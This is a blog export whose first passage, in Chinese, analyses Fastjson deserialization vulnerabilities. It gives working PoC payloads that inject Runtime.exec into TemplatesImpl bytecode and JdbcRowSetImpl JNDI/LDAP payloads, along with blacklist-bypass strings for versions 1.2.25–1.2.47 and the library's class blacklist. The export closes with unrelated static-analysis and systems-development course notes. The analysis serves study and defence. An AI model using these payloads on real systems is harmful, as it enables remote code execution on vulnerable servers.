<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getEvilCode</span><span class="params">()</span> <span class="keyword">throws</span> CannotCompileException, IOException, NotFoundException &#123;</span><br><span class="line">    <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">    <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> classPool.makeClass(<span class="string">&quot;Evil&quot;</span>);</span><br><span class="line">    classPool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(AbstractTranslet.class));</span><br><span class="line">    ctClass.makeClassInitializer().insertBefore(<span class="string">&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);</span><br><span class="line">    ctClass.setSuperclass(classPool.getCtClass(AbstractTranslet.class.getName()));</span><br><span class="line"></span><br><span class="line">    <span class="type">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line">    <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(bytes);</span><br><span class="line">    System.out.println(s);</span><br><span class="line">    <span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol>
<li>这里为什么要继承<strong>AbstractTranslet</strong>呢？</li>
</ol>
<p>我们在讲cc2链的时候说过，我们生成的恶意代码是在static代码块的，我们仍然需要让class对象被创建，这样才能执行我们的恶意代码。</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211127161222841.png" alt="img"></p>
<p>此处<strong>TemplatesImpl#getTransletInstance</strong>中，我们需要执行了<code>newInstance()</code>才能触发漏洞，而执行的字节码需要继承AbstractTranslet</p>
<ol start="2">
<li>为什么<strong>bytecodes</strong>最后需要用<strong>Base64</strong>编码？</li>
</ol>
<p>实际上fastjson在对field进行反序列化的时候，会进行base64解码，具体的我没有跟，有兴趣的师傅可以跟一下<code>FieldDeserializer#parseField</code></p>
<h3 id="POC构造与分析"><a href="#POC构造与分析" class="headerlink" title="POC构造与分析"></a>POC构造与分析</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilClass</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getEvilCode</span><span class="params">()</span> <span class="keyword">throws</span> CannotCompileException, IOException, NotFoundException &#123;</span><br><span class="line">    <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">    <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> classPool.makeClass(<span class="string">&quot;Evil&quot;</span>);</span><br><span class="line">    classPool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(AbstractTranslet.class));</span><br><span class="line">    ctClass.makeClassInitializer().insertBefore(<span class="string">&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);</span><br><span class="line">    ctClass.setSuperclass(classPool.getCtClass(AbstractTranslet.class.getName()));</span><br><span class="line"></span><br><span class="line">    <span class="type">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line">    <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(bytes);</span><br><span class="line">    System.out.println(s);</span><br><span class="line">    <span class="keyword">return</span> s;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> CannotCompileException, IOException, NotFoundException &#123;</span><br><span class="line"></span><br><span class="line">        String evilJson=<span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&quot;,\&quot;_bytecodes\&quot;:[\&quot;&quot;</span>+getEvilCode()+<span class="string">&quot;\&quot;],\&quot;_name\&quot;:\&quot;leihehe\&quot;,\&quot;_tfactory\&quot;:&#123; &#125;,\&quot;outputProperties\&quot;:&#123; &#125;&#125;\n&quot;</span>;</span><br><span class="line">        JSON.parseObject(evilJson,Object.class,Feature.SupportNonPublicField);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>此处outputProperties会让fastjson找到getOuputProperties()，从而触发利用链。</p>
<p>但需要注意的是，在TemplatesImpl类中这几个方法是private的，所以我们需要开启<code>Feature.SupportNonPublicField</code>，这里也是导致<code>TemplatesImpl</code>链在fastjson反序列化漏洞利用中有所<strong>局限性</strong>的主要原因。</p>
<p>另外，在我们使用parseObject()时，需要指定为Object.class，否则返回的类型是JSONObject类型</p>
<p><code>JSON.parseObject()</code>和<code>JSON.parse()</code>需要满足的格式：</p>
<blockquote>
<p><code>JSON.parseObject(evilJson, Object.class, Feature.SupportNonPublicField);</code></p>
<p><code>JSON.parse(evilJson,Feature.SupportNonPublicField);</code></p>
</blockquote>
<p>后面的field基本上就是用反射的形式，设置value，例如<code>_bytecodes</code></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220109150412316.png" alt="image-20220109150412316"></p>
<p>最后的outputProperties也一样，最后通过反射执行。<img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220109150849934.png" alt="image-20220109150849934"></p>
<p>弹出计算器</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220109150954388.png" alt="image-20220109150954388"></p>
<h2 id="总结两条利用链的区别"><a href="#总结两条利用链的区别" class="headerlink" title="总结两条利用链的区别"></a>总结两条利用链的区别</h2><p>TemplatesImpl</p>
<ul>
<li>当fastjson不出网时，可以盲打</li>
<li>版本在1.2.22起才有SupportNonPublicField特性,且要求在代码中开启SupportNonPublicField.</li>
</ul>
<p>JdbcRowSetImpl链</p>
<ul>
<li>利用范围更广</li>
<li>当fastjson不出网时，无法完成jndi注入，同时高版本中的jdk有一些限制，只能通过利用本地类来完成反序列化漏洞利用。</li>
</ul>
<h2 id="Fastjson各个版本分析"><a href="#Fastjson各个版本分析" class="headerlink" title="Fastjson各个版本分析"></a>Fastjson各个版本分析</h2><h3 id="1-2-25版本变化"><a href="#1-2-25版本变化" class="headerlink" title="1.2.25版本变化"></a>1.2.25版本变化</h3><p>可以发现在1.2.25中: <code>TypeUtils.loadClass()</code>被修改为了<code>checkAutoType()</code></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220109214228148.png" alt="image-20220109214228148"></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220109214347945.png" alt="image-20220109214347945"></p>
<p>1.2.25版本中，首先对autoTypeSupport布尔值进行判断，如果autoTypeSupport为true，那么开始检查黑名单和白名单，如果都不满足，则从Mapping中获取class。</p>
<p>如果autoTypeSupport为false，那么循环遍历白名单与黑名单，如果在黑名单中，则抛出异常，如果不在白名单中，则最后抛出<code>&quot;autoType is not support xxx&quot;</code>异常，因此如果autoTypeSupport为false，就一定无法执行成功。</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220109221758660.png" alt="image-20220109221758660"></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220109214959269.png" alt="image-20220109214959269"></p>
<p>黑名单如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">bsh</span><br><span class="line">com.mchange</span><br><span class="line">com.sun.<span class="comment">//这是templatesImpl和JdbcRowSetImpl所在的package</span></span><br><span class="line">java.lang.Thread</span><br><span class="line">java.net.Socket</span><br><span class="line">java.rmi</span><br><span class="line">javax.xml</span><br><span class="line">org.apache.bcel</span><br><span class="line">org.apache.commons.beanutils</span><br><span class="line">org.apache.commons.collections.Transformer</span><br><span class="line">org.apache.commons.collections.functors</span><br><span class="line">org.apache.commons.collections4.comparators</span><br><span class="line">org.apache.commons.fileupload</span><br><span class="line">org.apache.myfaces.context.servlet</span><br><span class="line">org.apache.tomcat</span><br><span class="line">org.apache.wicket.util</span><br><span class="line">org.codehaus.groovy.runtime</span><br><span class="line">org.hibernat</span><br><span class="line">org.jboss</span><br><span class="line">org.mozilla.javascript</span><br><span class="line">org.python.core</span><br><span class="line">org.springframework</span><br></pre></td></tr></table></figure>

<h3 id="1-2-25-1-2-41绕过"><a href="#1-2-25-1-2-41绕过" class="headerlink" title="1.2.25-1.2.41绕过"></a>1.2.25-1.2.41绕过</h3><p>因为黑名单中有<code>com.sun</code>，因此想要<strong>直接</strong>绕过黑名单基本是不可能了</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220109231952820.png" alt="image-20220109231952820"></p>
<p>我们需要寻找其他方法来避开黑名单的检测。此后的绕过过程我们都以JdbcRowSetImpl链来分析。另外，因为1.2.25后添加了autoTypeSupport Check，因此我们需要先将<code>autoTypeSupport</code>设为<strong>true</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line">        String evilStr=<span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;[com.sun.rowset.JdbcRowSetImpl\&quot;[&#123;\&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:7777/#EvilObject\&quot;,\&quot;autoCommit\&quot;:true&#125;&quot;</span>;</span><br><span class="line">        JSON.parseObject(evilStr,Object.class);</span><br></pre></td></tr></table></figure>

<p>在第三行下个断点进行分析：</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220109233459957.png" alt="image-20220109233459957"></p>
<p>我们发现最后一定会进入<code>checkAutoType()</code></p>
<p>如果既不在白名单，也不再黑名单中，则会执行以下代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="built_in">this</span>.autoTypeSupport || expectClass != <span class="literal">null</span>) &#123;</span><br><span class="line">    clazz = TypeUtils.loadClass(typeName, <span class="built_in">this</span>.defaultClassLoader);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>即call到TypeUtils#loadClass方法</p>
<p>但我们的所要进行反序列化的类都是在黑名单里面的，怎么办呢？</p>
<p>我们继续跟进loadClass看看。发现loadClass中有两个检测：</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220109233742373.png" alt="image-20220109233742373"></p>
<p><strong>如果是<code>[</code>开头的class name，就去掉<code>[</code>，并返回一个array类型的的新对象</strong></p>
<p><strong>如果是<code>L</code>开头、<code>;</code>结尾的class name，就去掉首尾，加载中间的class</strong></p>
<h4 id="方法一：以-开头"><a href="#方法一：以-开头" class="headerlink" title="方法一：以[开头"></a>方法一：以[开头</h4><p>那么我们试试以<code>[</code>开头</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220109235030406.png" alt="image-20220109235030406"></p>
<p>按照提示在后面加个<code>[</code>，报了一个新的错误，需要再添加一个<code>&#123;</code></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220109235105137.png" alt="image-20220109235105137"></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220109235132417.png" alt="image-20220109235132417"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> CannotCompileException, IOException, NotFoundException &#123;</span><br><span class="line">    ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line">    String evilStr=<span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;[com.sun.rowset.JdbcRowSetImpl\&quot;[&#123;,\&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:7777/#EvilObject\&quot;,\&quot;autoCommit\&quot;:true&#125;&quot;</span>;</span><br><span class="line">    JSON.parseObject(evilStr,Object.class);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>现在计算器就可以成功弹出了。</p>
<p>这个POC看起来实在奇怪，fastjson是如何区别数组类型的参数的，为何以<code>[</code>开头，后面就一定要跟<code>[&#123;</code>，我猜测是在正常流程中，fastjson做了一些处理，让字符串以<code>[</code>开头，表示后面的是一串数组json，因此会去寻找<code>[&#123;</code></p>
<h4 id="方法二：以L开头-结尾"><a href="#方法二：以L开头-结尾" class="headerlink" title="方法二：以L开头;结尾"></a>方法二：以L开头;结尾</h4><p>前面有分析到，以<code>L</code>开头，<code>;</code>结尾的class name会被截取中间的部分，然后传入loadClass。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">....</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (className.startsWith(<span class="string">&quot;L&quot;</span>) &amp;&amp; className.endsWith(<span class="string">&quot;;&quot;</span>)) &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">newClassName</span> <span class="operator">=</span> className.substring(<span class="number">1</span>, className.length() - <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> loadClass(newClassName, classLoader);</span><br><span class="line">....</span><br></pre></td></tr></table></figure>

<p>那么我们可以构造以下的POC：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> CannotCompileException, IOException, NotFoundException &#123;</span><br><span class="line">    ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line">    </span><br><span class="line">    String evilStr=<span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;Lcom.sun.rowset.JdbcRowSetImpl;\&quot;,\&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:7777/#EvilObject\&quot;,\&quot;autoCommit\&quot;:true&#125;&quot;</span>;</span><br><span class="line">    JSON.parseObject(evilStr,Object.class);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220110124835115.png" alt="image-20220110124835115"></p>
<p>成功弹出计算器。</p>
<h3 id="1-2-42版本变化"><a href="#1-2-42版本变化" class="headerlink" title="1.2.42版本变化"></a>1.2.42版本变化</h3><p>在ParserConfig#checkAutoType()中，检测到<code>L</code>开头<code>;</code>结尾的classname，就会将首尾去掉，然后再放入黑名单中检查。</p>
<p>同时黑名单做了hash加密，但因为加密方式在<code>com.alibaba.fastjson.util.TypeUtils#fnv1a_64</code>中能找到，所以可以自己写脚本进行hash碰撞。</p>
<p>这里已经有人<a href="https://github.com/LeadroyaL/fastjson-blacklist">整理出来了</a></p>
<h3 id="1-2-42绕过"><a href="#1-2-42绕过" class="headerlink" title="1.2.42绕过"></a>1.2.42绕过</h3><h4 id="方法一：以-开头-1"><a href="#方法一：以-开头-1" class="headerlink" title="方法一：以[开头"></a>方法一：以[开头</h4><p>新版本并未考虑到<code>[</code>开头的绕过方式，所以依旧可用：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> CannotCompileException, IOException, NotFoundException &#123;</span><br><span class="line">    ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line">    String evilStr=<span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;[com.sun.rowset.JdbcRowSetImpl\&quot;[&#123;,\&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:7777/#EvilObject\&quot;,\&quot;autoCommit\&quot;:true&#125;&quot;</span>;</span><br><span class="line">    JSON.parseObject(evilStr,Object.class);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="方法二：以LL开头-结尾"><a href="#方法二：以LL开头-结尾" class="headerlink" title="方法二：以LL开头;;结尾"></a>方法二：以LL开头;;结尾</h4><p>绕过黑名单其实很简单，因为此处只对<code>L</code>和<code>;</code>做了一次检测，所以我们写两次就可以了。</p>
<p>POC如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> CannotCompileException, IOException, NotFoundException &#123;</span><br><span class="line">    ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line">  </span><br><span class="line">    String evilStr=<span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;LLcom.sun.rowset.JdbcRowSetImpl;;\&quot;,\&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:7777/#EvilObject\&quot;,\&quot;autoCommit\&quot;:true&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    JSON.parseObject(evilStr,Object.class);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>计算器成功弹出：</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220110134359041.png" alt="image-20220110134359041"></p>
<h3 id="1-2-43版本变化及绕过"><a href="#1-2-43版本变化及绕过" class="headerlink" title="1.2.43版本变化及绕过"></a>1.2.43版本变化及绕过</h3><p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220110134617419.png" alt="image-20220110134617419"></p>
<p>这里对复写LL;;的方式也做了检测，因此不能再使用这种方式绕过了。</p>
<p>但以<code>[</code>开头的方式依然可以绕过</p>
<p><strong>POC:</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> CannotCompileException, IOException, NotFoundException &#123;</span><br><span class="line">    ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line">    String evilStr=<span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;[com.sun.rowset.JdbcRowSetImpl\&quot;[&#123;,\&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:7777/#EvilObject\&quot;,\&quot;autoCommit\&quot;:true&#125;&quot;</span>;</span><br><span class="line">    JSON.parseObject(evilStr,Object.class);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="1-2-44版本变化"><a href="#1-2-44版本变化" class="headerlink" title="1.2.44版本变化"></a>1.2.44版本变化</h3><p>在checkAutoType中对<code>[</code>开头的classname也做了检测，因此我们之前的方法失效。</p>
<p>这里找出了新的利用链，且并不在黑名单中：但必须要有需要有第三方组件<strong>ibatis-core 3:0</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> CannotCompileException, IOException, NotFoundException &#123;</span><br><span class="line">    ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line">    </span><br><span class="line">    String evilStr= <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\&quot;,\&quot;properties\&quot;:&#123;\&quot;data_source\&quot;:\&quot;ldap://localhost:7777/#EvilObject\&quot;&#125;&#125;&quot;</span>;</span><br><span class="line">    JSON.parseObject(evilStr,Object.class);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="1-2-25-1-2-47通杀"><a href="#1-2-25-1-2-47通杀" class="headerlink" title="1.2.25 - 1.2.47通杀"></a>1.2.25 - 1.2.47通杀</h3><p>这里不再调试了，大概就是不停的绕过。</p>
<p>fastjon中有一个判断，如果发现是Class类型，那么就会执行<code>com.alibaba.fastjson.util.TypeUtils#loadClass</code>，loadClass()中先通过java.lang.Class绕过了黑名单检测，并将该Class添加到了mapping中（会判断cache是否为true，默认为true），从而绕过了autoType中的检测。</p>
<blockquote>
<ul>
<li>1.2.25-1.2.32版本：未开启AutoTypeSupport时能成功利用，开启AutoTypeSupport不能利用</li>
<li>1.2.33-1.2.47版本：无论是否开启AutoTypeSupport，都能成功利用</li>
</ul>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;a&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.Class&quot;</span>,</span><br><span class="line">        <span class="string">&quot;val&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&quot;b&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,</span><br><span class="line">        <span class="string">&quot;dataSourceName&quot;</span>:<span class="string">&quot;ldap://localhost:1389/badNameClass&quot;</span>,</span><br><span class="line">        <span class="string">&quot;autoCommit&quot;</span>:<span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="1-2-48版本变化"><a href="#1-2-48版本变化" class="headerlink" title="1.2.48版本变化"></a>1.2.48版本变化</h3><p>将默认cache设为了false，就无法将class放入mapping了。</p>
<h2 id="Fastjson不出网利用"><a href="#Fastjson不出网利用" class="headerlink" title="Fastjson不出网利用"></a>Fastjson不出网利用</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl<span class="comment">//feature需要设为允许给非public属性赋值</span></span><br><span class="line">    </span><br><span class="line">org.apache.tomcat.dbcp.dbcp2.BasicDataSource<span class="comment">//需要dbcp或者tomcat-dbcp的依赖即可（dbcp是数据库连接池）</span></span><br></pre></td></tr></table></figure>

<p>dbcp链暂时放在之后再分析。</p>
<h2 id="Reference-8"><a href="#Reference-8" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://www.yuque.com/tianxiadamutou/zcfd4v/xehnw7">Fastjson JdbcRowSetImpl 链及后续漏洞分析</a></p>
<p><a href="https://xz.aliyun.com/t/8979#toc-0">Fastjson 1.2.22-1.2.24反序列化漏洞分析</a></p>
<p><a href="https://yyz9.cn/2021/08/07/fastjson%E5%90%84%E4%B8%AA%E7%89%88%E6%9C%AC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">fastjson各个版本反序列化漏洞分析</a></p>
]]></content>
      <categories>
        <category>Web Security</category>
        <category>Java Deserialization</category>
      </categories>
      <tags>
        <tag>Web Security</tag>
        <tag>Java Deserialization</tag>
      </tags>
  </entry>
  <entry>
    <title>Static Analysis Notes</title>
    <url>/2021/12/20/Static-Analysis-Notes/</url>
    <content><![CDATA[<h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>By chance, I found a course called Static Analysis taught by Nanjing University professors. There are a lot of recommendations on how to learn this course and most of them coming down to this - watching the relative videos - Static Analysis is being a major trend. </p>
<p>I searched for Monash University’s static analysis courses online and found they offer some of these courses. Sadly, they are graduate courses or research projects, so I do not have the opportunity to apply.</p>
<p>Static analysis techniques have been used to assess the security of applications as well as to verify a program’s properties. For easy understanding, my notes are being written in English, and I hope to cover the most important concepts of the entire Static analysis learning process.</p>
<span id="more"></span>

<h1 id="S1-Introduction"><a href="#S1-Introduction" class="headerlink" title="S1 Introduction"></a>S1 Introduction</h1><h2 id="Sound-amp-Truth"><a href="#Sound-amp-Truth" class="headerlink" title="Sound &amp; Truth"></a>Sound &amp; Truth</h2><blockquote>
<p>TP True Positive: found a real error</p>
<p>FP False Positive: false alarm </p>
<p>TN True Negative: no error, no alarm—OK </p>
<p>FN False Negative: missed error</p>
</blockquote>
<p>Sound: no false negatives - no missed error</p>
<p>Complete: no false positive - no false alarm</p>
<p>Mostly compromising completeness: We prefer <strong>sound</strong> but not fully-precise static analysis.</p>
<h2 id="Abstraction-amp-over-approximation"><a href="#Abstraction-amp-over-approximation" class="headerlink" title="Abstraction &amp; over-approximation"></a>Abstraction &amp; over-approximation</h2><p>Abstraction is used for representing results using an abstract value.</p>
<p>Transfer functions define how to evaluate different program statements on abstract values.</p>
<p>Transfer functions are defined according to “analysis problem” and the “semantics” of different program statements.</p>
<p><strong>An example</strong></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211220163142471.png" alt="image-20211220163142471"></p>
<p>Over-approximation may produce false positives.</p>
<h2 id="Self-checking"><a href="#Self-checking" class="headerlink" title="Self-checking"></a>Self-checking</h2><ul>
<li>What are the differences between static analysis and (dynamic) testing?</li>
<li>Understand soundness, completeness, false negatives and false positives.</li>
<li>Why soundness is required by static analysis?</li>
<li>How to understand abstraction and over-approximation?</li>
</ul>
<h1 id="S2-Intermediate-Representation"><a href="#S2-Intermediate-Representation" class="headerlink" title="S2 Intermediate Representation"></a>S2 Intermediate Representation</h1><p>Intermediate Representation = IR</p>
<h2 id="Compilers-and-Static-Analyzers"><a href="#Compilers-and-Static-Analyzers" class="headerlink" title="Compilers and Static Analyzers"></a>Compilers and Static Analyzers</h2>]]></content>
      <categories>
        <category>Development</category>
        <category>Static Analysis</category>
      </categories>
      <tags>
        <tag>Static Analysis</tag>
      </tags>
  </entry>
  <entry>
    <title>Systems Development Course Review</title>
    <url>/2021/06/04/Systems-Development-Course-Review/</url>
    <content><![CDATA[<p><strong>This note is for the course from Monash University - FIT2001.</strong></p>
<h2 id="S1-Nature-of-Systems-Development"><a href="#S1-Nature-of-Systems-Development" class="headerlink" title="S1: Nature of Systems Development"></a>S1: Nature of Systems Development</h2><h3 id="Information-systems"><a href="#Information-systems" class="headerlink" title="Information systems"></a>Information systems</h3><h4 id="What-are-the-information-systems"><a href="#What-are-the-information-systems" class="headerlink" title="What are the information systems?"></a>What are the information systems?</h4><span id="more"></span>

<h5 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h5><p>Information systems: <strong>a integrated set of components</strong> for <strong>collecting, storing, and processing data and for delivering information</strong>.</p>
<p>The main components of an information systems are - <strong>people, procedures, hardware, software, databases, data warehouses and telecommunications</strong>.</p>
<h5 id="Sample-question"><a href="#Sample-question" class="headerlink" title="Sample question"></a>Sample question</h5><p>Briefly discuss why the Student Enrolment system is an information system and, describe its key components.</p>
<p>A: </p>
<ul>
<li><p><strong>Reason</strong>:</p>
<p><strong>Collecting</strong>: collect students’ enrolment data, </p>
<p><strong>Storing</strong>:  store the students’ enrolment data</p>
<p><strong>Processing</strong>: to know whether you are on track on complete that course. </p>
<p><strong>Delivering</strong>: give a list of classes / lecturer could see who enrolled his/her course.</p>
</li>
<li><p><strong>Key components:</strong></p>
<p><strong>people</strong>: adamic stuff -&gt; put the courses in the system</p>
<p><strong>procedures</strong>: students input data into the system and the data will be check if valid? If the chosen unit matches students’ major field?</p>
<p><strong>hardware</strong>: laptop, PC, printers, screens…</p>
<p><strong>software</strong>: written programs, OS</p>
<p><strong>databases</strong>: student information will be stored in the databases.</p>
<p><strong>telecommunications</strong>: network</p>
</li>
</ul>
<h3 id="Systems-Development-Life-Cycle-SDLC"><a href="#Systems-Development-Life-Cycle-SDLC" class="headerlink" title="Systems Development Life Cycle(SDLC)"></a>Systems Development Life Cycle(SDLC)</h3><h4 id="Phases-in-the-SDLC-Key-activities-IADI"><a href="#Phases-in-the-SDLC-Key-activities-IADI" class="headerlink" title="Phases in the SDLC - Key activities(IADI)"></a>Phases in the SDLC - Key activities(IADI)</h4><h5 id="phase-1-Initiation"><a href="#phase-1-Initiation" class="headerlink" title="phase 1: Initiation"></a>phase 1: Initiation</h5><h6 id="key-activities"><a href="#key-activities" class="headerlink" title="key activities"></a>key activities</h6><ul>
<li><p>Review and priorities project requests</p>
</li>
<li><p>Assess project feasibility</p>
</li>
<li><p>Develop the project plan</p>
</li>
</ul>
<h5 id="phase-2-Analysis"><a href="#phase-2-Analysis" class="headerlink" title="phase 2: Analysis"></a>phase 2: Analysis</h5><h6 id="key-activities-1"><a href="#key-activities-1" class="headerlink" title="key activities"></a>key activities</h6><ul>
<li>Determine detailed user requirements.</li>
<li>Create system models to confirm requirements and for design.</li>
<li>Perform <em>Build vs Buy</em> analysis.</li>
</ul>
<h5 id="phase-3-Design"><a href="#phase-3-Design" class="headerlink" title="phase 3: Design"></a>phase 3: Design</h5><h6 id="key-activities-2"><a href="#key-activities-2" class="headerlink" title="key activities"></a>key activities</h6><ul>
<li>Define technical architecture.</li>
<li>Produce technical specs.</li>
<li>Create database.</li>
</ul>
<h5 id="phase-4-Implementation"><a href="#phase-4-Implementation" class="headerlink" title="phase 4: Implementation"></a>phase 4: Implementation</h5><h6 id="key-activities-3"><a href="#key-activities-3" class="headerlink" title="key activities"></a>key activities</h6><ul>
<li>Build, Test, Validate.</li>
<li>Conduct Integration, System and Acceptance testing.</li>
<li>Create User Docs, Train users.</li>
